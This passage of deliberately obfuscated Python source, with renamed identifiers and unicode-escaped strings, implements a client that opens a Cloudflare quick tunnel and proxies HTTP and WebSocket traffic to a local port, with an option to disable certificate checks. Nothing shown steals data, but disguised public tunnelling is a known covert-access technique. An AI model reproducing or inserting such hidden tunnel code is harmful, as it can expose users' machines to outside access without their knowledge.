                self.send_headers(O0_var_671, [(codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0035\\u0030\\u0032', 'unicode_escape'))], True)
            except OSError:
                pass

    def run(self):
        O0_var_684 = O0_fn_22(self.sock, 24)
        if O0_var_684 != b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n':
            raise ValueError(codecs.decode('\\u0065\\u0064\\u0067\\u0065\\u0020\\u0064\\u0069\\u0064\\u0020\\u006e\\u006f\\u0074\\u0020\\u0073\\u0065\\u006e\\u0064\\u0020\\u0074\\u0068\\u0065\\u0020\\u0048\\u0054\\u0054\\u0050\\u002f\\u0032\\u0020\\u0063\\u006c\\u0069\\u0065\\u006e\\u0074\\u0020\\u0070\\u0072\\u0065\\u0066\\u0061\\u0063\\u0065', 'unicode_escape'))
        self.send_frame(4, 0, 0, struct.pack(codecs.decode('\\u003e\\u0048\\u0049', 'unicode_escape'), 3, 100))
        if self.show_tunnel and (not self.tunnel_state[codecs.decode('\\u0070\\u0072\\u0069\\u006e\\u0074\\u0065\\u0064', 'unicode_escape')]):
            print(self.tunnel_url, flush=True)
            self.tunnel_state[codecs.decode('\\u0070\\u0072\\u0069\\u006e\\u0074\\u0065\\u0064', 'unicode_escape')] = True
        while not self.stopped:
            O0_var_685, O0_var_686, O0_var_687, O0_var_688 = self.read_frame()
            if O0_var_685 == 4:
                if not O0_var_686 & 1:
                    if len(O0_var_688) % 6:
                        raise ValueError(codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0053\\u0045\\u0054\\u0054\\u0049\\u004e\\u0047\\u0053\\u0020\\u0070\\u0061\\u0079\\u006c\\u006f\\u0061\\u0064', 'unicode_escape'))
                    for O0_var_689 in range(0, len(O0_var_688), 6):
                        O0_var_690, O0_var_691 = struct.unpack_from(codecs.decode('\\u003e\\u0048\\u0049', 'unicode_escape'), O0_var_688, O0_var_689)
                        if O0_var_690 == 4:
                            O0_var_692 = O0_var_691 - 65535
                            for O0_var_693 in self.stream_windows:
                                self.stream_windows[O0_var_693] = max(0, self.stream_windows[O0_var_693] + O0_var_692)
                        elif O0_var_690 == 5 and 16384 <= O0_var_691 <= 16777215:
                            self.peer_max_frame = O0_var_691
                    self.send_frame(4, 1, 0)
                continue
            if O0_var_685 == 6:
                if not O0_var_686 & 1:
                    self.send_frame(6, 1, 0, O0_var_688)
                continue
            if O0_var_685 == 8:
                if len(O0_var_688) != 4:
                    continue
                O0_var_694 = struct.unpack(codecs.decode('\\u003e\\u0049', 'unicode_escape'), O0_var_688)[0] & 2147483647
                if O0_var_687 == 0:
                    with self.window_condition:
                        self.connection_window += O0_var_694
                        self.window_condition.notify_all()
                else:
                    with self.window_condition:
                        self.stream_windows[O0_var_687] = self.stream_windows.get(O0_var_687, 65535) + O0_var_694
                        self.window_condition.notify_all()
                continue
            if O0_var_685 == 3:
                self.streams.pop(O0_var_687, None)
                continue
            if O0_var_685 == 7:
                break
            if O0_var_685 == 1:
                O0_var_695 = self.read_headers(O0_var_686, O0_var_687, O0_var_688)
                self.stream_windows.setdefault(O0_var_687, 65535)
                self.handle_headers(O0_var_687, O0_var_686, O0_var_695)
                continue
            if O0_var_685 == 0:
                self.handle_data(O0_var_687, O0_var_686, O0_var_688)
                continue

    def handle_headers(self, O0_var_696, O0_var_697, headers):
        O0_var_698 = {}
        for O0_var_699, O0_var_700 in headers:
            if O0_var_699.startswith(codecs.decode('\\u003a', 'unicode_escape')):
                O0_var_698[O0_var_699] = O0_var_700
            else:
                O0_var_698[O0_var_699.lower()] = O0_var_700
        O0_var_701 = O0_var_698.get(CONTROL_HEADER, codecs.decode('', 'unicode_escape')).strip().lower()
        if O0_var_701 == CONTROL_STREAM:
            self.open_control(O0_var_696)
            if O0_var_697 & 1:
                self.control.finished = True
            return
        request = {codecs.decode('\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064', 'unicode_escape'): O0_var_698.get(codecs.decode('\\u003a\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064', 'unicode_escape'), codecs.decode('\\u0047\\u0045\\u0054', 'unicode_escape')), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_698.get(codecs.decode('\\u003a\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'), codecs.decode('\\u002f', 'unicode_escape')), codecs.decode('\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape'): O0_var_698.get(codecs.decode('\\u003a\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape'), codecs.decode('', 'unicode_escape')), codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape'): [(O0_var_699, O0_var_700) for O0_var_699, O0_var_700 in headers if not O0_var_699.startswith(codecs.decode('\\u003a', 'unicode_escape'))], codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): bytearray(), codecs.decode('\\u0075\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065', 'unicode_escape'): O0_var_701, codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape'): O0_var_701 == codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape') or O0_var_698.get(codecs.decode('\\u003a\\u0070\\u0072\\u006f\\u0074\\u006f\\u0063\\u006f\\u006c', 'unicode_escape'), codecs.decode('', 'unicode_escape')).lower() == codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape'), codecs.decode('\\u0065\\u006e\\u0064\\u0065\\u0064', 'unicode_escape'): bool(O0_var_697 & 1), codecs.decode('\\u0066\\u0069\\u006e\\u0069\\u0073\\u0068\\u0065\\u0064', 'unicode_escape'): False}
        self.streams[O0_var_696] = request
        if request[codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape')]:
            request[codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u005f\\u0070\\u0072\\u006f\\u0078\\u0079', 'unicode_escape')] = WebSocketProxy(self, O0_var_696, request, self.origin, self.log)
            request[codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u005f\\u0070\\u0072\\u006f\\u0078\\u0079', 'unicode_escape')].start()
        elif request[codecs.decode('\\u0065\\u006e\\u0064\\u0065\\u0064', 'unicode_escape')]:
            self.request_finished(O0_var_696, request)

    def handle_data(self, O0_var_702, O0_var_703, O0_var_704):
        self.send_window_update(0, len(O0_var_704))
        self.send_window_update(O0_var_702, len(O0_var_704))
        if self.control is not None and self.control.stream_id == O0_var_702:
            self.control.feed(O0_var_704)
            if O0_var_703 & 1:
                self.control.finished = True
            return
        request = self.streams.get(O0_var_702)
        if request is None:
            return
        if request.get(codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u005f\\u0070\\u0072\\u006f\\u0078\\u0079', 'unicode_escape')) is not None:
            request[codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u005f\\u0070\\u0072\\u006f\\u0078\\u0079', 'unicode_escape')].feed(O0_var_704, bool(O0_var_703 & 1))
            return
        request[codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape')].extend(O0_var_704)
        if O0_var_703 & 1:
            request[codecs.decode('\\u0065\\u006e\\u0064\\u0065\\u0064', 'unicode_escape')] = True
            self.request_finished(O0_var_702, request)

class WebSocketProxy:

    def __init__(self, O0_var_705, O0_var_706, request, O0_var_707, logger):
        self.connection = O0_var_705
        self.stream_id = O0_var_706
        self.request = request
        self.origin = O0_var_707
        self.log = logger
        self.incoming = queue.Queue()
        self.stopped = threading.Event()
        self.sock = None

    def start(self):
        threading.Thread(target=self.run, daemon=True).start()

    def feed(self, O0_var_708, O0_var_709=False):
        if O0_var_708:
            self.incoming.put(O0_var_708)
        if O0_var_709:
            self.incoming.put(None)

    def run(self):
        O0_var_710 = None
        try:
            self.sock = O0_fn_20(self.origin)
            self.send_handshake()
            response = http.client.HTTPResponse(self.sock, method=codecs.decode('\\u0047\\u0045\\u0054', 'unicode_escape'))
            response.begin()
            O0_var_711 = response.getheaders()
            O0_var_712 = []
            O0_var_713 = []
            for O0_var_714, O0_var_715 in O0_var_711:
                O0_var_716 = O0_var_714.lower()
                if O0_var_716 == codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'):
                    O0_var_713.append((O0_var_716, O0_var_715))
                if not (O0_var_716.startswith(codecs.decode('\\u0063\\u0066\\u002d\\u0069\\u006e\\u0074\\u002d', 'unicode_escape')) or O0_var_716.startswith(codecs.decode('\\u0063\\u0066\\u002d\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0064\\u002d', 'unicode_escape')) or O0_var_716.startswith(codecs.decode('\\u0063\\u0066\\u002d\\u0070\\u0072\\u006f\\u0078\\u0079\\u002d', 'unicode_escape')) or O0_var_716.startswith(codecs.decode('\\u003a', 'unicode_escape'))) or O0_var_716 in {codecs.decode('\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u0075\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065', 'unicode_escape'), codecs.decode('\\u0073\\u0065\\u0063\\u002d\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u002d\\u0061\\u0063\\u0063\\u0065\\u0070\\u0074', 'unicode_escape')}:
                    O0_var_712.append((O0_var_716, O0_var_715))
            O0_var_717 = O0_fn_19(O0_var_712)
            O0_var_718 = 200 if response.status == 101 else response.status
            O0_var_719 = [(codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), str(O0_var_718))]
            O0_var_719.extend(O0_var_713)
            O0_var_719.append((codecs.decode('\\u0063\\u0066\\u002d\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0064\\u002d\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065\\u002d\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape'), O0_var_717))
            O0_var_719.append((codecs.decode('\\u0063\\u0066\\u002d\\u0063\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0064\\u002d\\u0072\\u0065\\u0073\\u0070\\u006f\\u006e\\u0073\\u0065\\u002d\\u006d\\u0065\\u0074\\u0061', 'unicode_escape'), codecs.decode('\\u007b\\u0022\\u0073\\u0072\\u0063\\u0022\\u003a\\u0022\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e\\u0022\\u002c\\u0022\\u0066\\u006c\\u006f\\u0077\\u005f\\u0072\\u0061\\u0074\\u0065\\u005f\\u006c\\u0069\\u006d\\u0069\\u0074\\u0065\\u0064\\u0022\\u003a\\u0066\\u0061\\u006c\\u0073\\u0065\\u007d', 'unicode_escape')))
            self.connection.send_headers(self.stream_id, O0_var_719)
            O0_var_710 = threading.Thread(target=self.write_to_origin, daemon=True)
            O0_var_710.start()
            while not self.stopped.is_set():
                O0_var_720 = self.sock.recv(65536)
                if not O0_var_720:
                    break
                self.connection.send_data(self.stream_id, O0_var_720, False)
            self.connection.send_data(self.stream_id, b'', True)
        except Exception as exc:
            self.log.warning(codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u0020\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u0025\\u0073\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), self.stream_id, exc)
            try:
                self.connection.send_headers(self.stream_id, [(codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0035\\u0030\\u0032', 'unicode_escape'))], True)
            except OSError:
                pass
        finally:
            self.stopped.set()
            self.incoming.put(None)
            if self.sock is not None:
                try:
                    self.sock.shutdown(socket.SHUT_RDWR)
                except OSError:
                    pass
                try:
                    self.sock.close()
                except OSError:
                    pass

    def send_handshake(self):
        O0_var_721 = urlsplit(self.origin)
        O0_var_722 = self.request[codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')] if self.request[codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')].startswith(codecs.decode('\\u002f', 'unicode_escape')) else codecs.decode('\\u002f', 'unicode_escape') + self.request[codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')]
        O0_var_723 = [codecs.decode('\\u0047\\u0045\\u0054\\u0020\\u0025\\u0073\\u0020\\u0048\\u0054\\u0054\\u0050\\u002f\\u0031\\u002e\\u0031', 'unicode_escape') % O0_var_722]
        O0_var_724 = False
        O0_var_725 = False
        O0_var_726 = False
        for O0_var_727, O0_var_728 in self.request[codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape')]:
            O0_var_729 = O0_var_727.lower()
            if O0_var_729 in {codecs.decode('\\u0068\\u006f\\u0073\\u0074', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u0075\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'), codecs.decode('\\u0074\\u0072\\u0061\\u006e\\u0073\\u0066\\u0065\\u0072\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape')}:
                continue
            if O0_var_729 == codecs.decode('\\u0073\\u0065\\u0063\\u002d\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u002d\\u006b\\u0065\\u0079', 'unicode_escape'):
                O0_var_724 = True
            elif O0_var_729 == codecs.decode('\\u0073\\u0065\\u0063\\u002d\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074\\u002d\\u0076\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e', 'unicode_escape'):
                O0_var_725 = True
            elif O0_var_729 == codecs.decode('\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e', 'unicode_escape'):
                O0_var_726 = True
            O0_var_723.append(codecs.decode('\\u0025\\u0073\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % (O0_var_727, O0_var_728))
        O0_var_730 = O0_var_721.netloc
        O0_var_723.append(codecs.decode('\\u0048\\u006f\\u0073\\u0074\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % O0_var_730)
        if not O0_var_726 and self.request.get(codecs.decode('\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape')):
            O0_var_723.append(codecs.decode('\\u004f\\u0072\\u0069\\u0067\\u0069\\u006e\\u003a\\u0020\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0025\\u0073', 'unicode_escape') % self.request[codecs.decode('\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape')])
        if not O0_var_724:
            O0_var_723.append(codecs.decode('\\u0053\\u0065\\u0063\\u002d\\u0057\\u0065\\u0062\\u0053\\u006f\\u0063\\u006b\\u0065\\u0074\\u002d\\u004b\\u0065\\u0079\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % base64.b64encode(secrets.token_bytes(16)).decode())
        if not O0_var_725:
            O0_var_723.append(codecs.decode('\\u0053\\u0065\\u0063\\u002d\\u0057\\u0065\\u0062\\u0053\\u006f\\u0063\\u006b\\u0065\\u0074\\u002d\\u0056\\u0065\\u0072\\u0073\\u0069\\u006f\\u006e\\u003a\\u0020\\u0031\\u0033', 'unicode_escape'))
        O0_var_723.append(codecs.decode('\\u0043\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u003a\\u0020\\u0055\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065', 'unicode_escape'))
        O0_var_723.append(codecs.decode('\\u0055\\u0070\\u0067\\u0072\\u0061\\u0064\\u0065\\u003a\\u0020\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape'))
        self.sock.sendall((codecs.decode('\\u000d\\u000a', 'unicode_escape').join(O0_var_723) + codecs.decode('\\u000d\\u000a\\u000d\\u000a', 'unicode_escape')).encode(codecs.decode('\\u0069\\u0073\\u006f\\u002d\\u0038\\u0038\\u0035\\u0039\\u002d\\u0031', 'unicode_escape')))

    def write_to_origin(self):
        while not self.stopped.is_set():
            O0_var_731 = self.incoming.get()
            if O0_var_731 is None:
                return
            try:
                self.sock.sendall(O0_var_731)
            except OSError:
                self.stopped.set()
                return

class ControlStream:

    def __init__(self, O0_var_732, O0_var_733, logger):
        self.connection = O0_var_732
        self.stream_id = O0_var_733
        self.log = logger
        self.buffer = b''
        self.finished = False

    def start(self, O0_var_734, O0_var_735, O0_var_736, O0_var_737):
        self.connection.send_data(self.stream_id, O0_fn_10(0), False)
        self.connection.send_data(self.stream_id, O0_fn_11(1, 0, O0_var_734, O0_var_735, O0_var_736, O0_var_737), False)

    def feed(self, O0_var_738):
        self.buffer += O0_var_738
        O0_var_739, self.buffer = O0_fn_12(self.buffer)
        for O0_var_740 in O0_var_739:
            try:
                O0_var_741 = O0_fn_15(O0_var_740)
                if O0_var_741[codecs.decode('\\u006f\\u006b', 'unicode_escape')]:
                    self.log.info(codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u0020\\u0072\\u0065\\u0067\\u0069\\u0073\\u0074\\u0065\\u0072\\u0065\\u0064\\u0020\\u0061\\u0074\\u0020\\u0025\\u0073', 'unicode_escape'), O0_var_741.get(codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u0075\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e', 'unicode_escape')))
                    self.connection.registered = True
                else:
                    self.log.warning(codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0072\\u0065\\u0067\\u0069\\u0073\\u0074\\u0072\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), O0_var_741.get(codecs.decode('\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'), codecs.decode('\\u0075\\u006e\\u006b\\u006e\\u006f\\u0077\\u006e\\u0020\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape')))
            except Exception as exc:
                self.log.debug(codecs.decode('\\u0069\\u0067\\u006e\\u006f\\u0072\\u0069\\u006e\\u0067\\u0020\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c\\u0020\\u0052\\u0050\\u0043\\u0020\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), exc)

def O0_fn_19(headers):
    O0_var_742 = []
    for O0_var_743, O0_var_744 in headers:
        O0_var_745 = base64.b64encode(O0_var_743.encode()).decode().rstrip(codecs.decode('\\u003d', 'unicode_escape'))
        O0_var_746 = base64.b64encode(O0_var_744.encode()).decode().rstrip(codecs.decode('\\u003d', 'unicode_escape'))
        O0_var_742.append(O0_var_745 + codecs.decode('\\u003a', 'unicode_escape') + O0_var_746)
    return codecs.decode('\\u003b', 'unicode_escape').join(O0_var_742)

def O0_fn_20(O0_var_747):
    O0_var_748 = urlsplit(O0_var_747)
    if O0_var_748.scheme not in {codecs.decode('\\u0068\\u0074\\u0074\\u0070', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073', 'unicode_escape')} or not O0_var_748.hostname:
        raise ValueError(codecs.decode('\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e\\u0020\\u006d\\u0075\\u0073\\u0074\\u0020\\u0062\\u0065\\u0020\\u0061\\u006e\\u0020\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0020\\u006f\\u0072\\u0020\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0020\\u0055\\u0052\\u004c', 'unicode_escape'))
    O0_var_749 = O0_var_748.port or (443 if O0_var_748.scheme == codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073', 'unicode_escape') else 80)
    O0_var_750 = socket.create_connection((O0_var_748.hostname, O0_var_749), timeout=30)
    if O0_var_748.scheme == codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073', 'unicode_escape'):
        O0_var_751 = ssl.create_default_context()
        O0_var_750 = O0_var_751.wrap_socket(O0_var_750, server_hostname=O0_var_748.hostname)
    O0_var_750.settimeout(None)
    return O0_var_750

def O0_fn_21(O0_var_752, method, O0_var_753, O0_var_754, body):
    O0_var_755 = urlsplit(O0_var_752)
    if O0_var_755.scheme not in {codecs.decode('\\u0068\\u0074\\u0074\\u0070', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073', 'unicode_escape')} or not O0_var_755.hostname:
        raise ValueError(codecs.decode('\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e\\u0020\\u006d\\u0075\\u0073\\u0074\\u0020\\u0062\\u0065\\u0020\\u0061\\u006e\\u0020\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0020\\u006f\\u0072\\u0020\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u0020\\u0055\\u0052\\u004c', 'unicode_escape'))
    O0_var_756 = O0_var_755.port or (443 if O0_var_755.scheme == codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073', 'unicode_escape') else 80)
    O0_var_757 = http.client.HTTPConnection(O0_var_755.hostname, O0_var_756, timeout=30)
    if O0_var_755.scheme == codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073', 'unicode_escape'):
        O0_var_757 = http.client.HTTPSConnection(O0_var_755.hostname, O0_var_756, timeout=30)
    O0_var_758 = {}
    for O0_var_759, O0_var_760 in O0_var_754:
        O0_var_761 = O0_var_759.lower()
        if O0_var_761 in {codecs.decode('\\u0068\\u006f\\u0073\\u0074', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('\\u0074\\u0072\\u0061\\u006e\\u0073\\u0066\\u0065\\u0072\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'), codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')}:
            continue
        O0_var_758[O0_var_759] = O0_var_760
    O0_var_758[codecs.decode('\\u0048\\u006f\\u0073\\u0074', 'unicode_escape')] = O0_var_755.netloc
    if body:
        O0_var_758[codecs.decode('\\u0043\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u004c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape')] = str(len(body))
    O0_var_762 = O0_var_753 if O0_var_753.startswith(codecs.decode('\\u002f', 'unicode_escape')) else codecs.decode('\\u002f', 'unicode_escape') + O0_var_753
    O0_var_757.request(method, O0_var_762, body=body or None, headers=O0_var_758)
    response = O0_var_757.getresponse()
    return {codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): response.status, codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape'): response.getheaders(), codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): response}

def O0_fn_22(O0_var_763, O0_var_764):
    O0_var_765 = []
    O0_var_766 = O0_var_764
    while O0_var_766:
        O0_var_767 = O0_var_763.recv(O0_var_766)
        if not O0_var_767:
            raise EOFError(codecs.decode('\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u0020\\u0063\\u006c\\u006f\\u0073\\u0065\\u0064', 'unicode_escape'))
        O0_var_765.append(O0_var_767)
        O0_var_766 -= len(O0_var_767)
    return b''.join(O0_var_765)

def O0_fn_23(O0_var_768, logger):
    O0_var_769 = list(EDGE_HOSTS)
    secrets.SystemRandom().shuffle(O0_var_769)
    O0_var_770 = None
    for O0_var_771 in O0_var_769:
        O0_var_772 = None
        O0_var_773 = None
        try:
            O0_var_772 = socket.create_connection((O0_var_771, EDGE_PORT), timeout=10)
            O0_var_774 = ssl.create_default_context() if O0_var_768 else ssl._create_unverified_context()
            O0_var_774.set_alpn_protocols([codecs.decode('\\u0068\\u0032', 'unicode_escape')])
            O0_var_773 = O0_var_774.wrap_socket(O0_var_772, server_hostname=codecs.decode('\\u0068\\u0032\\u002e\\u0063\\u0066\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002e\\u0063\\u006f\\u006d', 'unicode_escape'))
            if O0_var_773.selected_alpn_protocol() not in {None, codecs.decode('\\u0068\\u0032', 'unicode_escape')}:
                raise OSError(codecs.decode('\\u0065\\u0064\\u0067\\u0065\\u0020\\u0064\\u0069\\u0064\\u0020\\u006e\\u006f\\u0074\\u0020\\u006e\\u0065\\u0067\\u006f\\u0074\\u0069\\u0061\\u0074\\u0065\\u0020\\u0068\\u0032', 'unicode_escape'))
            O0_var_773.settimeout(None)
            logger.info(codecs.decode('\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0065\\u0064\\u0020\\u0074\\u006f\\u0020\\u0025\\u0073\\u003a\\u0025\\u0064', 'unicode_escape'), O0_var_771, EDGE_PORT)
            return O0_var_773
        except (OSError, ssl.SSLError) as exc:
            O0_var_770 = exc
            if O0_var_773 is not None:
                O0_var_773.close()
            elif O0_var_772 is not None:
                O0_var_772.close()
            logger.warning(codecs.decode('\\u0065\\u0064\\u0067\\u0065\\u0020\\u0025\\u0073\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), O0_var_771, exc)
    raise OSError(codecs.decode('\\u0061\\u006c\\u006c\\u0020\\u0043\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0020\\u0065\\u0064\\u0067\\u0065\\u0073\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % O0_var_770)

class _ArgoLogAdapter:

    @staticmethod
    def _format(message, args):
        return message % args if args else message

    def debug(self, message, *args):
        Logger.debug(self._format(message, args))

    def info(self, message, *args):
        Logger.info(self._format(message, args))

    def warning(self, message, *args):
        Logger.warning(self._format(message, args))

    def error(self, message, *args):
        Logger.error(self._format(message, args))

class CloudflareQuickTunnel:

    def __init__(self, port, logger=None, O0_var_775=QUICK_SERVICE, O0_var_776=2.0, O0_var_777=None, silent=False):
        if O0_var_777 is None:
            O0_var_777 = os.getenv(codecs.decode('\\u004b\\u0049\\u0053\\u0041\\u004d\\u0041\\u005f\\u0045\\u0044\\u0047\\u0045\\u005f\\u0049\\u004e\\u0053\\u0045\\u0043\\u0055\\u0052\\u0045', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip().lower() != codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')
        self.port = port
        self.origin = codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0031\\u0032\\u0037\\u002e\\u0030\\u002e\\u0030\\u002e\\u0031\\u003a\\u0025\\u0064', 'unicode_escape') % port
        self.log = logger if logger is not None else _ArgoLogAdapter()
        self.quick_service = O0_var_775
        self.retry_seconds = O0_var_776
        self.verify_certificate = O0_var_777
        self.silent = silent
        self.hostname = None
        self.created_at = None
        self._stop = threading.Event()
        self._thread = None
        self._sock = None
        self._tunnel_state = {codecs.decode('\\u0070\\u0072\\u0069\\u006e\\u0074\\u0065\\u0064', 'unicode_escape'): False}

    def start(self):
        if self._thread is not None and self._thread.is_alive():
            return self.hostname
        O0_var_778, O0_var_779, O0_var_780, O0_var_781 = O0_fn_18(self.quick_service)
        self.hostname = O0_var_778 if O0_var_778.startswith(codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f', 'unicode_escape')) else codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f', 'unicode_escape') + O0_var_778
        self.created_at = int(time.time())
        self._stop.clear()
        self._sock = None
